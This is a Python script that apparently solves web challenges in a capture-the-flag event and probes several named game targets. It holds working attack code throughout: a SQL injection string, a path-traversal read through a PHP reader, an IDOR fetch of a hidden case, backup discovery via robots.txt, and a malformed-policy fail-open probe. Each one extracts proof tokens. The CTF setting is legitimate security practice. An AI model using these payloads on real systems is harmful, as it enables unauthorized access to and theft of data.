#!/usr/bin/env python3
"""Reconstructed probes used for Fail Open Friday's SS, TT, and MM targets.

This script only reads the assigned CTF targets and prints their evidence.
It does not submit answers to the Game Master.
"""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import re
from html.parser import HTMLParser
from urllib.parse import urlencode
from urllib.request import HTTPCookieProcessor, build_opener


SINGLE_TARGET = (
    "https://6d56d3dc6ccf7203297fa2f4bc3790c40731d7849bb36bfa."
    "2026.huntress.ctf.games"
)
TIME_TRIAL_TARGET = (
    "https://7ba90ab3c5041974fefd44c4f56b4cb9ed698e5a5039decf."
    "2026.huntress.ctf.games"
)
MASTERY_TARGETS = {
    "backup exposure": (
        "https://9ef56c109c120368b2ce45c28452870731c51686f4dd0a52."
        "2026.huntress.ctf.games"
    ),
    "case IDOR": (
        "https://5029deff442cfbae4b7b300e598026eab7e31262522d7b7e."
        "2026.huntress.ctf.games"
    ),
    "SQL injection": (
        "https://7b408ad986cbb933770b05b5297d6fc3a0fbacbb70c5e75e."
        "2026.huntress.ctf.games"
    ),
    "PHP file inclusion": (
        "https://b5dd88748b407d912a0970fc1204bb44aa83f729bf7f815a."
        "2026.huntress.ctf.games"
    ),
    "policy decoder": (
        "https://a6704378f973382db7d24aba9911ba37d3ef3baf63b3145e."
        "2026.huntress.ctf.games"
    ),
}

PROOF_RE = re.compile(r"proof_[a-f0-9]{32}")


def opener_with_cookies():
    """Keep a target's ordinary session cookie in memory for its API calls."""
    return build_opener(HTTPCookieProcessor(http.cookiejar.CookieJar()))


def get_bytes(opener, url: str) -> bytes:
    with opener.open(url, timeout=20) as response:
        return response.read()


def get_text(opener, url: str) -> str:
    return get_bytes(opener, url).decode("utf-8", "replace")


def get_json(opener, url: str):
    return json.loads(get_bytes(opener, url))


def print_result(label: str, value) -> None:
    print(f"\n[{label}]")
    print(json.dumps(value, ensure_ascii=False, indent=2))


def probe_policy_decoder(label: str, root: str) -> dict:
    """Read the public format, then send a deliberately malformed decision."""
    opener = opener_with_cookies()
    root = root.rstrip("/")
    clues = get_json(opener, root + "/api/clues")
    policy_format = get_json(
        opener, root + clues["policy_format_route"]
    )
    malformed_policy = policy_format["prefix"] + "not-base64!"
    query = urlencode({"policy": malformed_policy})
    result = get_json(
        opener,
        root + clues["feature_route"] + "?" + query,
    )
    return {
        "target": label,
        "clues": clues,
        "policy_format": policy_format,
        "malformed_value": malformed_policy,
        "result": result,
    }


class LinkCollector(HTMLParser):
    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            href = dict(attrs).get("href")
            if href:
                self.hrefs.append(href)


def probe_backup_exposure(root: str) -> dict:
    opener = build_opener()
    root = root.rstrip("/")
    robots = get_text(opener, root + "/robots.txt")
    match = re.search(r"(?im)^Disallow:\s*(\S+)", robots)
    if not match:
        raise RuntimeError("robots.txt did not disclose a disallowed path")

    archive_path = match.group(1)
    listing = get_text(opener, root + archive_path)
    links = LinkCollector()
    links.feed(listing)
    backup_path = next(
        (href for href in links.hrefs if href.endswith(".json.bak")),
        None,
    )
    if not backup_path:
        raise RuntimeError("archive listing did not link a JSON backup")

    backup_url = (
        root + backup_path
        if backup_path.startswith("/")
        else root + archive_path.rstrip("/") + "/" + backup_path
    )
    backup = get_text(opener, backup_url)
    proof = PROOF_RE.search(backup)
    return {
        "robots_txt": robots,
        "archive_path": archive_path,
        "backup_url": backup_url,
        "backup_content": backup,
        "proof": proof.group(0) if proof else None,
    }


def probe_case_idor(root: str) -> dict:
    opener = opener_with_cookies()
    root = root.rstrip("/")
    get_bytes(opener, root + "/")  # Establish the target's ordinary session.
    timeline = get_json(opener, root + "/api/timeline")
    event = next(
        event for event in timeline["events"]
        if event.get("visibility") == "reference_only"
    )
    case_id = event["case_id"]
    case = get_json(opener, f"{root}/api/cases/{case_id}")
    serialized_case = json.dumps(case)
    proof = PROOF_RE.search(serialized_case)
    return {
        "timeline_event": event,
        "case": case,
        "proof": proof.group(0) if proof else None,
    }


def probe_search_injection(root: str) -> dict:
    opener = build_opener()
    payload = "') OR '1'='1'-- "
    query = urlencode({"q": payload})
    page = get_text(opener, root.rstrip("/") + "/query?" + query)
    proof = PROOF_RE.search(page)
    titles = re.findall(r"<h3>(.*?)</h3>", page, flags=re.DOTALL)
    return {
        "query_value": payload,
        "result_titles": [re.sub(r"<[^>]+>", "", title) for title in titles],
        "proof": proof.group(0) if proof else None,
    }


def probe_php_file_inclusion(root: str) -> dict:
    opener = build_opener()
    document = "../../../../run/huntress/objective.txt"
    query = urlencode({"doc": document})
    page = get_text(opener, root.rstrip("/") + "/reader.php?" + query)
    proof = PROOF_RE.search(page)
    return {
        "document_value": document,
        "proof": proof.group(0) if proof else None,
    }


def run_single() -> None:
    print_result(
        "Single Solve policy decoder",
        probe_policy_decoder("Single Solve", SINGLE_TARGET),
    )


def run_time_trial() -> None:
    print_result(
        "Time Trial policy decoder",
        probe_policy_decoder("Time Trial", TIME_TRIAL_TARGET),
    )


def run_mastery() -> None:
    for label, root in MASTERY_TARGETS.items():
        if label == "backup exposure":
            result = probe_backup_exposure(root)
        elif label == "case IDOR":
            result = probe_case_idor(root)
        elif label == "SQL injection":
            result = probe_search_injection(root)
        elif label == "PHP file inclusion":
            result = probe_php_file_inclusion(root)
        else:
            result = probe_policy_decoder("Mastery Target 5", root)
        print_result(label, result)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "mode",
        choices=("single", "time-trial", "mastery", "all"),
        help="which assigned target set to probe",
    )
    args = parser.parse_args()

    if args.mode in ("single", "all"):
        run_single()
    if args.mode in ("time-trial", "all"):
        run_time_trial()
    if args.mode in ("mastery", "all"):
        run_mastery()


if __name__ == "__main__":
    main()
